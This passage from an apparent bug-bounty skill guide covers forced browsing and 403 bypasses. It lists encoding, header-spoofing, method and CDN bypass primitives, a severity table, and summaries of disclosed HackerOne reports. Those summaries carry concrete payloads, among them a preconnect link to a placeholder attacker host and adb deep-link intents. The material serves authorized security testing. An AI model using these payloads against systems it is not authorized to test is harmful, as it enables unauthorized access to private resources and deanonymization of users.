- Use `@`, `#`, and backslashes in URLs to split parser vs loader interpretation.

### Parser Null-Byte / Encoding
- `%00` in scheme, host, or `redirect_url`.
- Omit scheme where the library guesses one; compare with explicit scheme.
- Incomplete base URLs that make redirect pointer arithmetic unsafe (curl CWE-626).

### Obscurity-Bypass Mindset
- Enumerate *versions/history* routes, not just canonical ones.
- Walk deeper into forbidden trees.
- Follow every redirect to its **final** host.
- Try the unauthenticated request before assuming auth is required.

### UI-Wrap Bypasses (the "forced" part of forced browsing)

- **Deep-link directly to the resource** instead of navigating the UI flow that would enforce a step-up check.
- **Use a cached/prefetched page** — request the AJAX/JSON fragment the UI calls, not the page shell.
- **Call the export/download endpoint** rather than the report viewer that checks permissions.
- **Request the version/history route** that powers a "previous versions" UI but lacks its own gate.
- **Invoke the exported activity with an intent** rather than tapping through the app (mobile).
- **Replay an old request** captured before a permission change.

### Encoding & Normalization Mismatches

```
Double URL encoding:   %252fadmin  ->  %2fadmin  ->  /admin
Mixed case:            /AdMiN
Backslash:             /admin\..\secret
Semicolon matrix:      /admin;foo=/bar
Unicode:               /adm%ef%bc%8fn   (fullwidth slash)
Overlong UTF-8:        /%c0%afadmin
Dot-segment variants:  /admin/.  /admin/..  /./admin
```
The bypass works when the **validator decodes fewer times** than the resource loader. Determine the decode count empirically: send one, two, and three encoded layers and note which one reaches the file.

### Cache / Edge / CDN Bypasses

- Append a cache-buster (`?v=1`) if a cached denial is masking an allowed origin response.
- Vary the `Host` header between the CDN hostname and the origin hostname.
- Use `X-Forwarded-Host` / `X-Forwarded-Proto` to make the edge route differently from the origin.
- Try HTTP vs HTTPS — edge rules are often bound to one scheme.
- For absolute-URL request lines, test `GET http://target/admin HTTP/1.1` through a proxy that accepts them.

### Combining Primitives (when one is insufficient)

Some gates require two bypasses together. Examples:

- `X-Forwarded-For: 127.0.0.1` **plus** POST with `Content-Length: 0` — an edge IP check and an origin method check in sequence.
- `X-Original-URL: /admin` **plus** a trailing slash — edge overrides the path, origin normalizes the slash into the protected route.
- `../` prefix escape **plus** an allowlisted host — deep link begins with an allowed domain, then traverses to the target URL.
- Null byte **plus** explicit scheme — parser truncates at `%00` so the allowlist check sees a benign value.
- Redirect **plus** subdomain takeover — an open redirect points at a subdomain you control, which then forces the hidden resource through a trusted path.

### Bypass Success Checklist

Before declaring success, verify:

- [ ] The baseline request fails (403/401/404 or wrong content).
- [ ] A single, identifiable modification makes it succeed.
- [ ] You can reproduce the flip on demand.
- [ ] The successful response contains meaningful content, not just a status code.
- [ ] You can articulate which layer made the wrong decision.

---

## Gate 0 Validation

Before writing the report, confirm all three:

1. **What can the attacker do right now?**
   - Show the actual unauthorized response body: the secret file, the `nginx_status` content, the admin page, the WebView loading an external URL, or the inbound TCP connection from preconnect.
   - A bare 403→200 status flip is a start, but the impact must be concrete — what data or capability is exposed?
   - Confirm the resource is not intentionally public. If it is a public PDF, severity collapses.

2. **What does the victim lose?**
   - Confidential documents, dependency/RCE surface, internal topology, pre-release scope, hijacked app settings, or deanonymized visitors.
   - Quantify: number of files/records, sensitivity, and whether a chain (RCE, account takeover, traffic interception) exists.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Does the direct request work with no special state, timing, or prior UI action?
   - Can a second person follow the URL/headers and see the same unauthorized content?
   - If the result depends on a transient cache or a one-off redirect, stabilize it first.

**Never report** a 403 page that merely *mentions* a path, a 404 with no content, or a public file mislabelled as hidden. The bar is: direct request → unauthorized, meaningful content/capability.

### Severity Calibration

| Evidence | Typical severity | Notes |
|---|---|---|
| 403 → 200 on a status/metrics page | Low–Medium | Information disclosure; $250 for Acronis |
| Sensitive documents in upload dir | Medium | Depends on data sensitivity (Stellar) |
| Pre-release scope/state disclosed | Low–Medium | CVSS 2.7 for HackerOne |
| Hidden admin path, no auth | Medium–High | Depends on available actions |
| WebView JS + native bridge execution | Medium–High | CVSS 3.1 for Shopify deep link |
| Forced network side effect / IP leak | Medium | $560 for X/xAI |
| Exposed RCE-ready artifact | High–Critical | PHPUnit `eval-stdin.php` (Zomato, patched) |
| Forced custom scheme mutating settings | High | Tor bridge list (High) |

### The "Meaningful Content" Test

A status flip is only the doorway. Ask whether the response would matter to the owner:

- Does it reveal data they intended to keep private?
- Does it grant a capability they intended to restrict?
- Would a competitor, attacker, or regulator care?
- If the answer to all three is "no," treat it as informational or do not submit.

---

## Real Impact Examples

### Scenario A: Hidden Status Endpoint Exposed by Header Spoofing (Acronis Pattern)
`https://branded-us4-cloud.acronis.com/nginx_status/` returned 403. Adding `X-Forwarded-For: 127.0.0.1:80` returned 200 with the nginx status page content. Impact: information disclosure the operator intended to withhold — internal connection/hostname data from an endpoint believed to be loopback-only. Bounty: $250.

### Scenario B: Framework Artifact Exposure Chains to RCE (Zomato/Eternal Pattern)
The app exposed `/vendor/composer/installed.json` and `/vendor/slim/slim/composer.json`, fingerprinting Slim and installed libraries. `/vendor/bin/phpunit` and `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` were reachable. Although the installed PHPUnit was patched, the same exposure on an unpatched version would allow arbitrary PHP execution via `eval-stdin.php` — a direct-request misconfiguration escalated to RCE.

### Scenario C: Deep-Link Prefix Bypass into WebView + JS Bridge (Shopify Pattern)
The app's deep-link handler allowed `http(s)` for `shopify.com` / `*.myshopify.com` and enforced `/admin/...` path prefixes. Appending `../` to the URI caused arbitrary URLs to load in the WebView, unlocking JavaScript execution and the EASDK bridge. A related 2025 finding bypassed scheme validation entirely, loading attacker HTML/JS into the app's WebView. Impact: compromise of the app's trusted browsing context.

### Scenario D: 0-Click Victim IP Deanonymization (X / xAI Pattern)
A crafted page included `<link rel="preconnect">` to an attacker domain. Safari preloaded the target with no click; the attacker's server received a TCP connection exposing the victim's IP and hostname. Bounty: $560.

---

## Disclosed Report Citations

All 12 full reports from the study pack — verified IDs only:

- **Shopify — URL Scheme Validation Bypass in Shopify Mobile App Allows Javascript Execution** ([H1 #1737358](https://hackerone.com/reports/1737358)) — forced browsing / scheme-validation bypass into WebView JS + EASDK bridge, filter-bypass + subdomain-takeover, 2025.
  - Payload: URL supplied as an extra to `com.shopify.mobile.navigation.NavigationActivity`; scheme not validated, so arbitrary HTML/JS loads in the WebView.
  - Root cause: exported activity passes an unvalidated URL extra to the WebView; EASDK/SmartWebView interfaces enable Java execution.
- **Acronis — IP restriction bypass via X-Forwarded-For header** ([H1 #1224089](https://hackerone.com/reports/1224089)) — hidden `nginx_status/` endpoint, 403→200 via spoofed X-Forwarded-For, api-endpoint + host-header + internal-network + filter-bypass, 2021, $250.
  - Payload: `GET /nginx_status/` → 403; add `X-Forwarded-For: 127.0.0.1:80` → 200 with content.
  - Root cause: access decision trusts a client-supplied proxy header as proof of loopback origin.
- **HackerOne — View HackerOne challenge scope before challenge begins** ([H1 #565736](https://hackerone.com/reports/565736)) — pre-release hidden route `/scope_versions`, recon, 2019, CVSS 2.7.
  - Payload: `https://hackerone.com/{challengeName}/scope_versions` accessed while the challenge scope was still hidden.
  - Root cause: versions/history route not access-controlled before the documented release date.
- **U.S. Dept Of Defense — 403 Forbidden Bypass at www.██████.mil** ([H1 #991717](https://hackerone.com/reports/991717)) — 403 bypass via POST + Content-Length:0, redirect-handling + filter-bypass + open-redirect, 2020.
  - Payload: `curl -H "Content-Length:0" -X POST https://www.███████.mil/FORBIDDEN`; GET or missing header fails.
  - Root cause: authorization enforced for GET only; POST with explicit content length bypasses the gate.
- **X / xAI — Remote 0click exfiltration of Safari user's IP address** ([H1 #1392211](https://hackerone.com/reports/1392211)) — forced preconnect load leaks victim IP/hostname, server-side-rendering + image-processing + time-based + subdomain-takeover, 2021, $560.
  - Payload: `<link href="https://ATTACKER" rel="preconnect">` in a crafted tweet page; Safari preloads with no click.
  - Root cause: browser preconnect side effect leaks a TCP connection (IP/hostname) without user interaction.
- **Shopify — Improper deep link validation** ([H1 #1087744](https://hackerone.com/reports/1087744)) — path-prefix bypass via appended `../` into WebView, sso-oauth + redirect-handling + path-traversal-lfi + filter-bypass, 2021, CVSS 3.1.
  - Payload: `am start -W -a android.intent.action.VIEW -d "https://ravel17.myshopify.com/admin/collections/../../"`.
  - Root cause: validator checks path prefix without normalizing dot segments; WebView resolves the final URL.
- **Tor — [Android org.torproject.android] Possible to force list of bridges** ([H1 #252626](https://hackerone.com/reports/252626)) — forced `bridge://` scheme intent mutates app settings, custom-scheme forced browsing, 2017, High.
  - Payload: `adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx`.
  - Root cause: exported activity accepts a custom scheme from any app/browser and writes to shared_prefs.
- **Eternal — Potential server misconfiguration leads to disclosure of vendor/ directory** ([H1 #271391](https://hackerone.com/reports/271391)) — exposed `/vendor/` artifacts and PHPUnit RCE surface, misconfiguration, 2017.
  - Payload: `https://www.zomato.com/vendor/composer/installed.json`, `/vendor/bin/phpunit`, `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`.
  - Root cause: framework dependency directory inside web root; installed PHPUnit exposed (patched version, but RCE-ready if unpatched).
- **Stellar.org — Direct URL access to PDF files** ([H1 #263780](https://hackerone.com/reports/263780)) — unauthenticated access to `wp-content/uploads/` PDFs, server-side-rendering / direct file access, 2017.
  - Payload: `https://www.stellar.org/wp-content/uploads/2014/07/Bylaws-00580045-10.pdf` and the filed foundation PDF fetched directly.
  - Root cause: sensitive documents stored in a public upload directory with no authentication.
- **Ubiquiti Inc. — 200 http code in 403 forbidden directories on main Ubnt.com domain** ([H1 #220150](https://hackerone.com/reports/220150)) — reachable children inside forbidden `/static/` tree, xml-parser / incomplete ACL, 2017.
  - Payload: `/static/` and `/static/cm/` = 403; `/static/cm/mode/`, `/static/cm/mode/xml/`, `/static/cm/mode/django/` = 200.
  - Root cause: authorization applied at the top of the tree but not inherited by child directories.
- **curl — Mentioned unites are at the same time .Then we have to increase the bounty.** ([H1 #3761789](https://hackerone.com/reports/3761789)) — URL-API null-byte / redirect pointer-arithmetic bug in `lib/urlapi.c`, redirect-handling + null-byte + auth-bypass, 2026.
  - Payload: `lib/urlapi.c` diff removes `CURLU_NO_GUESS_SCHEME` so `redirect_url` pointer arithmetic stays valid for incomplete URLs; null-byte interaction (CWE-626).
  - Root cause: low-level URL string handling does not account for null characters and scheme guessing.
- **Maximum(maximum) — (untitled subdomain redirect report)** ([H1 #643446](https://hackerone.com/reports/643446)) — subdomain `corne.maximum.nl` redirected to third-party-controlled domain, subdomain + redirect-handling, 2019.
  - Payload: browse `corne.maximum.nl`; final destination is `maximum.com`, controlled by a third party.
  - Root cause: incorrect DNS/redirect record points a first-party subdomain at an external domain.

---

## Related Skills & Chains

- **`hunt-directory-bruteforce`** — forced browsing is the discovery half of content discovery; chain wordlist enumeration with the bypass primitives here to turn 403s into 200s.
- **`hunt-auth-bypass`** — header/method/path-override gates overlap directly; combine ACL bypass with sensitive-path discovery.
- **`hunt-idor`** — hidden routes and version/history paths often expose objects across users; forced browsing finds the route, IDOR proves cross-user impact.
- **`hunt-mobile-webview`** — scheme/deep-link validation bugs (Shopify) are the mobile specialization of forced browsing; chain to JS-bridge abuse.
- **`hunt-rce`** — exposed `phpunit`/`eval-stdin.php` or framework artifacts can escalate a direct-request finding to RCE.
- **`hunt-open-redirect`** — redirect-handling signals recur; a steered `Location` both hides and relocates hidden resources.
- **`hunt-recon`** — subdomain/redirect hygiene and stack fingerprinting feed directly into which artifacts to request.
- **`triage-validation`** — apply a strict Gate 0: direct request + meaningful unauthorized content + 10-minute reproducibility before submission.
